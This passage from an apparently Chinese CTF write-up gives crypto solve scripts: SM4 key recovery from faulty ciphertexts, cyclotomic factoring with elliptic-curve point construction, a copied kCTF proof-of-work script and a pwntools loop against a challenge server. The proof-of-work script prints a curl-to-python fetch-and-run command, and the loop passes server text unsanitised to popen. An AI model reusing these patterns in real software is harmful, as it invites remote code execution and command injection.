[rotl8(ar[i], i+3) for i in range(4)]        res.append(l2i(b))    return resdef invpfunc(res,D=DB):    bk = []    for i in range(4):        sbox = D[i]        b=i2l(res[i])        ar=[rotl8(b[j], 8-(j+3)) for j in range(4)]        bki=[sbox.index(_) for _ in ar]        bk.append(l2i(bki))    return bkdef one_round(bk, rk, dt):    out = []    buf = [0]*36    buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])]    for i in range(32):        if dt == i:            dance()        buf[i+4] = buf[i] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i])        buf[i+1:i+5] = pfunc(buf[i+1:i+5])    dance()    for _ in range(4):        out += i2l(buf[-1-_])    return outdef crypt_ecb(pt, key, dance_time=-1):    pt = pad(list(pt))    rk = expand_key(key)    block = [pt[_:_+16] for _ in range(0, len(pt), 16)]    result = b''    for i in block:        result += bytes(one_round(i, rk, dt=dance_time))    return resultt=lambda b:b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24)d=lambda b:rotl32(b,30)^rotl32(b,24)^rotl32(b,22)^rotl32(b,18)^rotl32(b,16)^rotl32(b,14)^rotl32(b,12)^rotl32(b,8)^rotl32(b,4)^rotl32(b,2)^bfrom random import *ct = ['e5a304ea2ffc53a1ff94337c2b2ae5368b46c6da3cc37f8438eb967b29249d4e', '6733baa353d4cfc4ff94337c58dc7fdbd6df83f4fbf6e5e838eb967b98d7e8d3', 'e77dbfe7868701fbd7072e6358dc7fdba067d296707bad1b0f4541dc98d7e8d3', '54b772d532556d5573a6ab667c9ff76857b5efc3b62130668e46a79b163138e4', '47339f6738dd9f4c9581fbd496dde76ea320d95b457e0373cddb910acc41fe35']    #for i in range(100):#    a=getrandbits(32)#    b=getrandbits(32)#    assert(tfunc(a)^tfunc(b)==tfunc(a^b))ct0t=bytes.fromhex(ct[0][:32])ct0f=bytes.fromhex(ct[1][:32])#ct1t=bytes.fromhex(ct[0][32:])#ct1f=bytes.fromhex(ct[1][32:])buft=[0]*36buff=[0]*36for i in range(4):    buft[-i-1]=l2i(ct0t[i*4:(i+1)*4])    buff[-i-1]=l2i(ct0f[i*4:(i+1)*4])buft[32:]=invpfunc(buft[32:],WDB)buff[32:]=invpfunc(buff[32:],WDB)#assert(invpfunc(buft[31:35],DB)[1:]==invpfunc(buff[31:35],WDB)[1:])dt=i2l(d(buff[35]^buft[35]))print(dt)dt=i2l(d(buff[35])^d(buft[35]))print(dt)rkl0=[set() for i in range(4)]print((dt))print(i2l(buff[32]^buft[32]))print(i2l(buff[33]^buft[33]))print(i2l(buff[34]^buft[34]))ict=i2l(buft[32]^buft[34]^buft[33])icf=i2l(buff[32]^buff[34]^buff[33])print(ict,icf)for i in range(4):    for guess in range(256):        if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]:            rkl0[i].add(guess)print(rkl0)            rkl0_1=copy(rkl0)print()#ct0t=bytes.fromhex(ct[0][:32])#ct0f=bytes.fromhex(ct[1][:32])ct0t=bytes.fromhex(ct[0][32:])ct0f=bytes.fromhex(ct[1][32:])buft=[0]*36buff=[0]*36for i in range(4):    buft[-i-1]=l2i(ct0t[i*4:(i+1)*4])    buff[-i-1]=l2i(ct0f[i*4:(i+1)*4])buft[32:]=invpfunc(buft[32:],WDB)buff[32:]=invpfunc(buff[32:],WDB)assert(invpfunc(buft[31:],DB)[1:]==invpfunc(buff[31:],WDB)[1:])dt=i2l(d(buff[35]^buft[35]))rkl0=[set() for i in range(4)]print((dt))print(i2l(buff[32]^buft[32]))print(i2l(buff[33]^buft[33]))print(i2l(buff[34]^buft[34]))ict=i2l(buft[32]^buft[34]^buft[33])icf=i2l(buff[32]^buff[34]^buff[33])print(ict,icf)for i in range(4):    for guess in range(256):        if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]:            rkl0[i].add(guess)print(rkl0)            rk=[]for rki in range(4):    print(rki)    ctt=[bytes.fromhex(ct[rki][:32]),bytes.fromhex(ct[rki][32:])]    ctf=[bytes.fromhex(ct[rki+1][:32]),bytes.fromhex(ct[rki+1][32:])]        buft=[0]*36    buff=[0]*36    rkl=[[set(),set()] for i in range(4)]    for times in range(2):        ct0t=ctt[times]            ct0f=ctf[times]            for i in range(4):            buft[-i-1]=l2i(ct0t[i*4:(i+1)*4])            buff[-i-1]=l2i(ct0f[i*4:(i+1)*4])        buft[32:]=invpfunc(buft[32:],WDB)        buff[32:]=invpfunc(buff[32:],WDB)        for i in range(rki):            buff[31-i] = buff[35-i] ^ tfunc(buff[34-i]^buff[33-i]^buff[32-i]^rk[i])            buff[31-i:35-i]=invpfunc(buff[31-i:35-i],WDB)            buft[31-i] = buft[35-i] ^ tfunc(buft[34-i]^buft[33-i]^buft[32-i]^rk[i])            buft[31-i:35-i]=invpfunc(buft[31-i:35-i],WDB)        assert(invpfunc(buft[31-rki:],DB)[1:]==invpfunc(buff[31-rki:],WDB)[1:])            ict=i2l(buft[32-rki]^buft[34-rki]^buft[33-rki])        icf=i2l(buff[32-rki]^buff[34-rki]^buff[33-rki])        dt=i2l(d(buff[35-rki]^buft[35-rki]))        for i in range(4):            for guess in range(256):                if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]:                    rkl[i][times].add(guess)        print(rkl)    rkn=[(rkl[i][0]&rkl[i][1]) for i in range(4)]    print(rkn)    assert(all([len(i)==1 for i in rkn]))    rkn=[list(i)[0] for i in rkn]    rk.append(l2i(rkn))    print(rk[::-1])def inv_expand_key(rk):    k = [0]*36    k[-4:] = rk    for i in range(32):        k[-i - 5] = k[-i-1] ^ (round_key(k[-i - 2] ^ k[-i - 3] ^ k[-i -4] ^ SM4_CK[-i-1]))    MK=xor(k[0:4],SM4_FK)        return MK,k[4:]from Crypto.Util.number import *MK,rks=inv_expand_key(rk[::-1])print(MK,rks)    def inv_one_round(bk, rk, dt):    out = []    buf = [0]*36    buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])]    buf=buf[::-1]    dance()    for i in range(31,-1,-1):        buf[i+1:i+5] = invpfunc(buf[i+1:i+5],Dance_Box)        buf[i] = buf[i+4] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i])        if dt == i:            dance()                    for _ in range(4):        out += i2l(buf[_])    return outprint(bytes(inv_one_round(bytes.fromhex(ct[0][:32]),rks,31))+bytes(inv_one_round(bytes.fromhex(ct[0][32:]),rks,31)))exit()for i in range(10):    key=long_to_bytes(getrandbits(128))    rk=expand_key(key)    ans=one_round(key,rk,31)    key1=inv_one_round(ans,rk,31)    print(key,key1)</code></pre><h3 id="e20k"><a href="#e20k" class="headerlink" title="e20k"></a>e20k</h3><p>注意到n=p<em>q</em>r=p<em>q</em>(2q-1) -&gt;2n=p<em>2q</em>(2q-1)=p<em>r</em>(r+1)，一眼分圆多项式，找个脚本，分解n</p><pre class=" language-TypeScript"><code class="language-TypeScript">#!/usr/bin/env sagefrom Crypto.Util.number import *P.<x, y> = PolynomialRing(ZZ)R.<z> = PolynomialRing(ZZ)z = R.gens()[0]def calculate_eta_all(eta, aa, bb, m, k):    eta_all = []    for i in range(k):        temp = eta^(aa^i)        add = temp        for _ in range((m-1)//k - 1):            add = add^bb            temp += add        eta_all.append(temp)    return eta_alldef calculate_irreducible_polynomial(eta_all, m):    h = 1    for i in range(k):        h *= (y - eta_all[i].lift())    d = sum([x^i for i in range(m)])    f_irreducible = h % d    return f_irreducible, ddef pad_polynomial_coefficients(f, m):    tmp = f.list()    while len(tmp) < m:        tmp.append(0)    return tmp    def Factoring_with_Cyclotomic_Polynomials(k, n):        Phi = cyclotomic_polynomial(k)    Psi = (z^k-1)//(cyclotomic_polynomial(k))    print('Cyclotomic_Polynomials Phi:', Phi)    print('Psi:', Psi)    m = 1    while True:        useful = False        while not useful:            m += k            if not isPrime(m):                continue            aa = primitive_root(m)            ff = x^m - 1            Q = P.quo(ff)            eta = Q.gens()[0]            for bb in range(2, m):                if (bb^((m-1)//k)-1)//(bb-1) % m:                    continue                eta_all = calculate_eta_all(eta, aa, bb, m, k)                f_irreducible, d = calculate_irreducible_polynomial(eta_all, m)                if f_irreducible.subs(y=0) in ZZ:                    useful = True                    break        eta0 = eta_all[0]        eta0_pow = []        for i in range(2, k):            eta0_pow_i = (eta0^i).lift().subs(x=z)            constant_term = eta0_pow_i.list()[0]            if constant_term != 0:                dd = (d-1).subs(x=z)                eta0_pow_i = eta0_pow_i - constant_term - constant_term * dd            eta0_pow.append(eta0_pow_i)        coeff = []        for i in range(k):            coeff.append(pad_polynomial_coefficients(eta_all[i].lift().subs(x=z), m))        A = matrix(QQ, coeff)        terget = [[-1]*k, [1] + [0]*(k-1)]        for i in range(k-2):            terget.append(A.solve_left(vector(pad_polynomial_coefficients(eta0_pow[i], m))))        B = matrix(QQ, terget)        U.<w> = PolynomialRing(QQ)        w = U.gens()[0]        eta1 = U(list((B^-1)[1]))        f = f_irreducible.subs(y=w)        V = U.quo(f)        eta1 = V(eta1)        C = matrix(QQ, k, k)        C[0, 0] = 1        for i in range(1, k):            tmp = eta1^i            C[i] = pad_polynomial_coefficients(tmp, k)        K.<s> = PolynomialRing(Zmod(n))        f_modulo = f_irreducible.subs(y=s)        K_quo = K.quo(f_modulo)        f_ZZ = f_irreducible.subs(y=z)        try:            sigma = matrix(Zmod(n), C)        except:            continue        while True:            g = R.random_element(k-1)            try:                kk, _, h = xgcd(f_ZZ, g)                h = inverse_mod(int(kk), n) * h                break            except:                continue        g = g.subs(y=x)               g_Q = K_quo(g)        h_Q = K_quo(h)        assert g_Q * h_Q == 1                Psi_coefficients = Psi.coefficients()        Psi_monomials = Psi.monomials()[::-1]        if Psi_coefficients[0] < 0:            yy = h_Q^(-Psi_coefficients[0])         else:            yy = g_Q^(Psi_coefficients[0])         for i in range(1, len(Psi_monomials)):            if Psi_coefficients[i] < 0:                yy *= K_quo(list(vector(list(h_Q^(-Psi_coefficients[i]))) * Psi_monomials[i](sigma)))            else:                yy *= K_quo(list(vector(list(g_Q^(Psi_coefficients[i]))) * Psi_monomials[i](sigma)))        yy = yy^n        if gcd(yy[1], n) > 2**20:            return gcd(yy[1], n)if __name__ == "__main__":    k = 2  # the k-th cyclotomic_polynomial    Phi = cyclotomic_polynomial(k)    N = int(input())    pp = Factoring_with_Cyclotomic_Polynomials(k, N)    assert not N % int(pp)    r=int(pp)    q=(r+1)//2    p=N//(q*r)    assert is_prime(r)    assert is_prime(q)    assert is_prime(p)    assert N%p==0    assert is_prime(q)    assert is_prime(r)    E=EllipticCurve(Zmod(N), [3, 7])    y2=lambda x :x^3+3*x+7    fs=[p,q,r]    E1=EllipticCurve(Zmod(p), [3, 7])    E2=EllipticCurve(Zmod(q), [3, 7])    E3=EllipticCurve(Zmod(r), [3, 7])    n1=E1.order()    n2=E2.order()    n3=E3.order()    ns=[n1,n2,n3]    try:        assert(all([ni%3==0 for ni in ns]))    except:        print("wrong")        exit()    O1=E1.random_point()*n1    P1=E1.random_point()    h1=n1//3    while h1*P1==O1:        P1=E1.random_point()            O2=E2.random_point()*n2    P2=E2.random_point()    h2=n2//3    while h2*P2==O2:        P2=E2.random_point()    O3=E3.random_point()*n3    P3=E3.random_point()    h3=n3//3    while h3*P3==O3:        P3=E3.random_point()            Qs=[h1*P1,h2*P2,h3*P3]    xs=[int(Qi.xy()[0]) for Qi in Qs]    x=crt(xs,fs)    ys=[int(Qi.xy()[1]) for Qi in Qs]    y=crt(ys,fs)       print(x,",",y)    print(E(x,y))    print(E(x,y)*4)    </code></pre><p>发现迭代有个A:=4*A的结构，来都来了，分解构造一下A为阶是3的点，不过需要多爆破pow（校园网被制裁了，获取了一份本地pow脚本来用）</p><pre class=" language-TypeScript"><code class="language-TypeScript">#!/usr/bin/env python3# -*- coding: utf-8 -*-# Copyright 2020 Google LLC## Licensed under the Apache License, Version 2.0 (the "License");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at##     https://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an "AS IS" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.import base64import osimport secretsimport socketimport sysimport hashlibtry:    import gmpy2    HAVE_GMP = Trueexcept ImportError:    HAVE_GMP = False    sys.stderr.write("[NOTICE] Running 10x slower, gotta go fast? pip3 install gmpy2\n")VERSION = 's'MODULUS = 2**1279-1CHALSIZE = 2**128SOLVER_URL = 'https://goo.gle/kctf-pow'def python_sloth_root(x, diff, p):    exponent = (p + 1) // 4    for i in range(diff):        x = pow(x, exponent, p) ^ 1    return xdef python_sloth_square(y, diff, p):    for i in range(diff):        y = pow(y ^ 1, 2, p)    return ydef gmpy_sloth_root(x, diff, p):    exponent = (p + 1) // 4    for i in range(diff):        x = gmpy2.powmod(x, exponent, p).bit_flip(0)    return int(x)def gmpy_sloth_square(y, diff, p):    y = gmpy2.mpz(y)    for i in range(diff):        y = gmpy2.powmod(y.bit_flip(0), 2, p)    return int(y)def sloth_root(x, diff, p):    if HAVE_GMP:        return gmpy_sloth_root(x, diff, p)    else:        return python_sloth_root(x, diff, p)def sloth_square(x, diff, p):    if HAVE_GMP:        return gmpy_sloth_square(x, diff, p)    else:        return python_sloth_square(x, diff, p)def encode_number(num):    size = (num.bit_length() // 24) * 3 + 3    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')def decode_number(enc):    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')def decode_challenge(enc):    dec = enc.split('.')    if dec[0] != VERSION:        raise Exception('Unknown challenge version')    return list(map(decode_number, dec[1:]))def encode_challenge(arr):    return '.'.join([VERSION] + list(map(encode_number, arr)))def get_challenge(diff):    x = secrets.randbelow(CHALSIZE)    return encode_challenge([diff, x])def solve_challenge(chal):    [diff, x] = decode_challenge(chal)    y = sloth_root(x, diff, MODULUS)    return encode_challenge([y])def can_bypass(chal, sol):    from ecdsa import VerifyingKey    from ecdsa.util import sigdecode_der    if not sol.startswith('b.'):        return False    sig = bytes.fromhex(sol[2:])    with open("/kctf/pow-bypass/pow-bypass-key-pub.pem", "r") as fd:        vk = VerifyingKey.from_pem(fd.read())    return vk.verify(signature=sig, data=bytes(chal, 'ascii'), hashfunc=hashlib.sha256, sigdecode=sigdecode_der)def verify_challenge(chal, sol, allow_bypass=True):    if allow_bypass and can_bypass(chal, sol):        return True    [diff, x] = decode_challenge(chal)    [y] = decode_challenge(sol)    res = sloth_square(y, diff, MODULUS)    return (x == res) or (MODULUS - x == res)def usage():    sys.stdout.write('Usage:\n')    sys.stdout.write('Solve pow: {} solve $challenge\n')    sys.stdout.write('Check pow: {} ask $difficulty\n')    sys.stdout.write('  $difficulty examples (for 1.6GHz CPU) in fast mode:\n')    sys.stdout.write('             1337:   1 sec\n')    sys.stdout.write('             31337:  30 secs\n')    sys.stdout.write('             313373: 5 mins\n')    sys.stdout.flush()    sys.exit(1)def main():    if len(sys.argv) != 3:        usage()        sys.exit(1)    cmd = sys.argv[1]    if cmd == 'ask':        difficulty = int(sys.argv[2])        if difficulty == 0:            sys.stdout.write("== proof-of-work: disabled ==\n")            sys.exit(0)        challenge = get_challenge(difficulty)        sys.stdout.write("== proof-of-work: enabled ==\n")        sys.stdout.write("please solve a pow first\n")        sys.stdout.write("You can run the solver with:\n")        sys.stdout.write("    python3 <(curl -sSL {}) solve {}\n".format(SOLVER_URL, challenge))        sys.stdout.write("===================\n")        sys.stdout.write("\n")        sys.stdout.write("Solution? ")        sys.stdout.flush()        solution = ''        with os.fdopen(0, "rb", 0) as f:            while not solution:                line = f.readline().decode("utf-8")                if not line:                    sys.stdout.write("EOF")                    sys.stdout.flush()                    sys.exit(1)                solution = line.strip()        if verify_challenge(challenge, solution):            sys.stdout.write("Correct\n")            sys.stdout.flush()            sys.exit(0)        else:            sys.stdout.write("Proof-of-work fail")            sys.stdout.flush()    elif cmd == 'solve':        challenge = sys.argv[2]        solution = solve_challenge(challenge)        if verify_challenge(challenge, solution, False):            sys.stderr.write("Solution: \n".format(solution))            sys.stderr.flush()            sys.stdout.write(solution)            sys.stdout.flush()            sys.stderr.write("\n")            sys.stderr.flush()            sys.exit(0)    else:        usage()    sys.exit(1)if __name__ == "__main__":    main()</code></pre><p>跑主程序爆破参数</p><pre class=" language-TypeScript"><code class="language-TypeScript">from pwn import *from os import *while 1:    p=remote("121.41.9.20","6665")    p.recvuntil(b"kctf-pow)")    s=p.recvline()    q=popen(" python3 n1pow.py "+s.decode()).read()    p.sendline(q)    p.recvuntil(b"N =")    s=p.recvline()    N=int(s)    q=process("c.sage")    q.sendline(str(N).encode())    print(q.recvline())    print(q.recvline())    s=(q.recvline())    print(s)    if b"wrong" in s:        q.close()        p.close()        continue    p.sendline(s)    print(q.recvline())    print(q.recvline())    p.recvuntil(b">")    f=open("ans","w")    for i in range(5):        s=p.recvline().decode()        f.write(s)    f.close()</code></pre><p>得到的数据如下</p><pre class=" language-TypeScript"><code class="language-TypeScript">[+] Starting local process './c.sage': pid 41666b'Cyclotomic_Polynomials Phi: x + 1\n'b'Psi: z - 1\n'b'wrong\n'[*] Stopped process './c.sage' (pid 41666)[*] Closed connection to 121.41.9.20 port 6665[+] Opening connection to 121.41.9.20 on port 6665: DoneSolution: [+] Starting local process './c.sage': pid 41925b'Cyclotomic_Polynomials Phi: x + 1\n'b'Psi: z - 1\n'b'1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 , 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424\n'b'(1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 : 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424 : 1)\n'b'(1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 : 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424 : 1)\n' A = [[2491297, 3923144, 1289455, 4021716, 337975, 3143770, 3557950, 341304, 455942, 4177670, 3340546, 4028765, 2320870, 3081978, 818985, 3242259, 995549, 2729547, 219631, 2130206, 2431889, 3437133, 705892, 3268589, 3687934, 958931, 2516192, 1860165, 1023453, 2954972, 2407318, 3854332, 2320389, 1597429, 171260, 2195369, 1977065, 2954121, 103688, 2179696, 3341984, 941977, 3206534, 1013687, 2216577, 2195795, 237843, 2334271, 2206600, 608485, 3503558, 2473745, 3883407, 3529280, 218265, 3883654, 324031, 186429, 4126800, 3153156, 2220126, 4061700, 3316219, 3172105, 1847039, 3294403, 4147423, 256592, 3436950, 3100090, 1520285, 2064569, 2565047, 1028084, 1620973, 1948607, 3549132, 2359710, 1992828, 3487450, 3612080, 441053, 2199156, 2890422, 2562147, 369063, 4107126, 1146899, 2775186, 3074284, 2753658, 4182387, 3832577, 775926, 4107285, 27264, 2878053, 515185, 258373, 1455220, 2856349, 2462819, 865942, 326474, 3358641, 948506, 2445678, 1017908, 3547779, 658361, 2829207, 1683034, 3768709, 233977, 2944173, 2089850, 2168140, 804839, 780839, 635210, 1308962, 1163123, 1713794, 98445, 2589738, 3272446, 2326080, 505141, 3906582, 4077935, 1000292, 3121629, 2704903, 3250847, 2300956, 2865041, 282192, 2033060, 657556, 1942823, 3110353, 3376364, 718090, 1806372, 499584, 3522863, 1521762, 2786971, 2140682, 216926, 753243, 2974405, 3427513, 1482251, 2946392, 620784, 2812018, 3708482, 3628507, 1350323, 2669060, 871044, 4080642, 48697, 831735, 2081975, 1003680, 2779456, 2768433, 1319487, 2764139, 2743293, 500875, 2756771, 688928, 2420450, 2542999, 3781383, 4020987, 4000070, 1373818, 923562, 877075, 2970373, 3037725, 3289830, 2511141, 4063531, 1637947, 23000, 4187246, 1996064, 1458136, 3977302, 3491665, 1028387, 4028398, 397765, 1760132, 3153398, 3810161, 1971495, 756643, 181167, 3346185, 2046059, 1731694, 1482343, 1273960, 3769920, 175011, 1974455, 2847092, 3199068, 1133365, 1840605, 1382941, 336790, 246835, 3524062, 2275571, 260893, 2522464, 3760909, 2401319, 1972892, 2192355, 2348559, 2968746, 1303894, 4037725, 1070976, 1650576, 3755849, 1724561, 1374666, 653155, 19966, 2152355, 3737399, 3755720, 1139557, 2850582, 3856019, 605733, 800279, 3507621, 311368, 1360210, 3610070, 1018469, 734703, 4111035, 3317616, 2509163, 1027214], [2345579, 3645598, 3313317, 868986, 2201238, 1012434, 4189116, 1833309, 4173250, 1539013, 2558865, 2459736, 3040085, 2641552, 2193150, 3142570, 2096227, 3497720, 3677427, 2826051, 2201963, 2032938, 1751020, 2338084, 501735, 1528173, 1190332, 4039135, 1073609, 2545180, 1483656, 2261722, 1502393, 1950848, 3415037, 2883983, 2952067, 2642902, 150578, 710864, 988399, 633646, 3124896, 1048336, 3864721, 328673, 1853513, 364917, 3308868, 1171552, 3653516, 1468422, 3032090, 2842047, 254437, 2104220, 2876379, 3130725, 1805478, 1526141, 1050520, 2759137, 634328, 4144451, 1239675, 557252, 3977009, 1058165, 4061107, 1956486, 3965945, 3733416, 1361329, 84827, 2915466, 4006254, 3823624, 2452237, 2204002, 1089647, 1309236, 2259059, 2315689, 161139, 3420761, 3165117, 32634, 310702, 1795941, 3035148, 1184669, 2379592, 1857466, 134155, 2562046, 254428, 1773396, 1212942, 2335734, 2443291, 538951, 1855586, 1032635, 3763662, 4017205, 2329915, 2709951, 723648, 168887, 838418, 938926, 1732765, 3484614, 3417960, 83567, 363241, 327574, 433880, 1098638, 179849, 2172410, 3152540, 1782369, 3655145, 2103838, 2060915, 1347678, 2374927, 3158348, 1250185, 3539603, 2618718, 815436, 2951094, 3879951, 1406088, 3907098, 3816768, 1957820, 2878717, 3972083, 1619762, 4147989, 3924744, 142801, 2985546, 2900015, 379251, 924103, 560227, 893488, 2927729, 3043682, 2100176, 3095382, 1948851, 818115, 1370625, 384082, 4177415, 3928916, 2162582, 3336817, 2073043, 3104122, 3531532, 3725890, 671778, 1545701, 1455832, 2491527, 2886274, 2566667, 2913638, 2814684, 1363911, 1069791, 3122004, 4138263, 1118042, 2967808, 1943444, 1439078, 1427258, 649506, 1747073, 3315692, 2404840, 3344307, 3058404, 1012657, 337436, 282239, 3987438, 3563971, 3232709, 1405828, 461145, 1246785, 1132791, 3004771, 660781, 172717, 3190937, 3876997, 2164256, 2070087, 3909187, 2876423, 2804502, 2649946, 28203, 3395597, 3364832, 4106070, 263331, 2648126, 1600290, 721167, 3991279, 2932850, 1816848, 1237930, 3805917, 683434, 56233, 2234822, 2720667, 301679, 4113339, 2938618, 2568280, 2085721, 1870990, 3946203, 1495215, 3487766, 916775, 1022709, 3495902, 1916009, 283993, 2414527, 2646368, 601247, 2633472, 1141376, 3114228, 978394, 2534075, 2624492, 590455, 828034, 1437948, 3805189, 2834344], [1704558, 816765, 3762174, 1494750, 1314054, 3081791, 4124342, 541062, 449851, 2310408, 2187891, 258791, 1466525, 1033243, 1953211, 2821936, 1326046, 2201689, 1504898, 1188458, 1968064, 729708, 3860108, 1748121, 445286, 2990623, 623241, 1555763, 837271, 1024731, 3186362, 3385837, 4040413, 717731, 2217974, 1436441, 4089141, 2329301, 115121, 3151348, 3927806, 2871048, 2096694, 2148109, 2215987, 742646, 2595695, 201314, 1196252, 4092574, 3413334, 1566110, 1452711, 2764185, 1843047, 2722853, 2821082, 3936775, 94394, 154605, 3496812, 3102180, 3668794, 1323547, 621691, 2689849, 3942136, 703083, 3951980, 2518921, 165811, 4039110, 3293950, 4005581, 3989260, 302252, 1500390, 3996893, 184110, 3568920, 2832436, 1967628, 1872907, 1142142, 2241968, 1837314, 4000338, 2183446, 3666725, 2555221, 3098309, 348421, 224049, 4131037, 513747, 4025743, 408370, 1133043, 107358, 917065, 3112215, 4085435, 2350218, 1200235, 2353263, 397736, 570928, 2745875, 1625517, 986524, 405084, 2704966, 1161971, 976713, 4007883, 1231129, 1768281, 1649306, 3886654, 2863786, 955169, 1241834, 3270723, 2366932, 1518102, 1551350, 305123, 3610014, 1417357, 119498, 2573323, 3770262, 3274151, 1204945, 533524, 698269, 4047049, 144159, 1733552, 1937443, 3526562, 2728688, 3366942, 3501818, 865077, 2972243, 349401, 692591, 3372260, 3817253, 3814556, 2961825, 2008053, 2231645, 1347363, 2366615, 3538574, 2064725, 3217945, 335197, 1625433, 3294612, 3313807, 3103512, 3913029, 1140, 3656003, 1300868, 960707, 2691728, 3461722, 2076883, 2762090, 1763491, 2659853, 2649390, 2543718, 2776401, 2115083, 991771, 2399598, 2898148, 983994, 2121942, 3267972, 3419492, 1325456, 2132297, 82758, 1037371, 2216854, 946909, 717051, 2690649, 1527256, 3216202, 212119, 213143, 1947188, 2019239, 1556156, 366669, 4086440, 3805270, 3629077, 1479207, 228876, 773062, 18116, 3825880, 2570871, 1032612, 3786367, 3167506, 1382747, 708805, 359386, 1092968, 265381, 832395, 1839924, 3186779, 1446616, 130730, 1839728, 718508, 378034, 554270, 2275993, 148025, 1677152, 1800446, 4127956, 2214902, 2077929, 4006828, 3345834, 1275040, 3872820, 3017394, 603581, 2917266, 791981, 1887610, 688591, 985010, 3732271, 1900118, 1358876, 1549589, 1813013, 1808563, 706400, 3935940, 1193314, 115921], [1274013, 3735294, 2972120, 4059752, 2836627, 2019431, 2586880, 3732312, 1357547, 3539208, 1549518, 2319645, 1735832, 713543, 2402513, 1082102, 582150, 2355894, 2891749, 1574407, 2360796, 194818, 4092509, 2828740, 4151941, 2777779, 4153191, 3084546, 665776, 478680, 1000398, 1674356, 3203569, 2365990, 358123, 2354367, 106370, 2270033, 732787, 169742, 1828784, 1481625, 813489, 2477957, 1229792, 2729352, 2866275, 2057713, 1227326, 2195519, 2888473, 3219172, 1877123, 3177232, 2924673, 3895833, 3210735, 4097704, 2741833, 3512236, 4117152, 2909683, 2331528, 2772270, 2564983, 3243833, 502914, 1276486, 31250, 3162804, 858144, 3993727, 4093294, 1988824, 3126098, 3472528, 1543910, 639283, 4106751, 2408836, 920223, 1619178, 4082729, 2392804, 2988073, 1701021, 637168, 3479362, 3539216, 3208843, 3160628, 3304419, 1513232, 1187076, 890760, 2723933, 1013302, 1706643, 1990119, 914849, 3051620, 2266231, 3167828, 1985379, 1294763, 1013235, 691641, 614804, 908753, 1793142, 4186308, 223077, 296466, 3094122, 375142, 3982343, 1837355, 3269322, 859890, 3351653, 2024995, 2850579, 3239764, 2696780, 1932390, 2300504, 2203648, 1115926, 2597636, 4162550, 1997742, 1350661, 3278081, 3708696, 692800, 1437388, 391611, 2181932, 2764640, 906844, 1777085, 400108, 2365510, 1381554, 2355958, 3181617, 3455732, 1173164, 2887967, 921139, 1781374, 1511714, 699951, 3425562, 2867911, 169570, 874748, 2434342, 1699422, 2981625, 2014154, 3049470, 829940, 1235688, 3777739, 1674803, 1168362, 4015868, 178143, 239988, 2689798, 2611450, 2838743, 1920275, 2807774, 2095417, 2054441, 285765, 161435, 3628559, 3292071, 257092, 418023, 3970008, 2149606, 1815174, 2943903, 2190266, 4083374, 2533108, 1804450, 2280451, 488329, 2655258, 303725, 794834, 2985520, 3353763, 313460, 641409, 350069, 1249795, 2518737, 1196538, 1062469, 4117679, 2137371, 3037576, 1525799, 1628834, 1851259, 3605877, 17674, 2146625, 3135852, 3846789, 3764278, 2443989, 2575252, 1214527, 2093221, 2528388, 1900521, 1286708, 1117773, 2478942, 3428491, 451114, 1164863, 4006248, 1653957, 1169296, 2151813, 2568214, 1207407, 3482199, 1193504, 1249941, 306877, 1966726, 470848, 2629118, 4092565, 1131887, 1249531, 1477343, 2552369, 1035404, 2284282, 2156209, 1083999, 1582261, 117275, 3449321, 3547909, 565898], [755247, 2004218, 3831019, 3310505, 377980, 3096277, 3570211, 1274098, 4066058, 2427810, 457273, 2880650, 2989099, 859363, 2778606, 1773657, 210751, 40001, 1458653, 157252, 195056, 2093708, 3369555, 2605385, 3320275, 3749099, 1477421, 1054171, 2772148, 638835, 87582, 2850418, 2763904, 3982904, 1953185, 2194746, 849749, 3065644, 1750476, 3588117, 1676718, 2935960, 849569, 831605, 2773794, 851833, 2623136, 3310115, 3180557, 3742379, 3287878, 336838, 2995874, 2832109, 544451, 2776875, 1371686, 3989874, 3469048, 2489362, 3007872, 1659039, 3661677, 597109, 453864, 1023305, 3585161, 98373, 536981, 76725, 1226337, 645920, 613436, 3357251, 3813251, 2694057, 2096916, 2427108, 1717671, 2321549, 2678039, 1615981, 3748204, 264229, 597758, 447948, 2909540, 53418, 2876859, 533811, 1500833, 2820669, 2449890, 4176775, 3587356, 4062670, 1943167, 477111, 534903, 3023573, 1167975, 582820, 482747, 2294862, 67516, 588818, 2819354, 2491476, 383064, 1318652, 1045070, 3855672, 2139215, 1898570, 2951153, 1572337, 702667, 212333, 574580, 460794, 1855606, 2852606, 1395044, 509667, 1236263, 4034804, 2068966, 2638790, 459146, 1654870, 1211495, 581021, 2488585, 3797276, 2352559, 2169006, 3140976, 2507736, 3151948, 1444374, 385704, 1335317, 3646075, 3695509, 3108143, 898043, 2100525, 2909814, 1571195, 2834524, 2811040, 2776459, 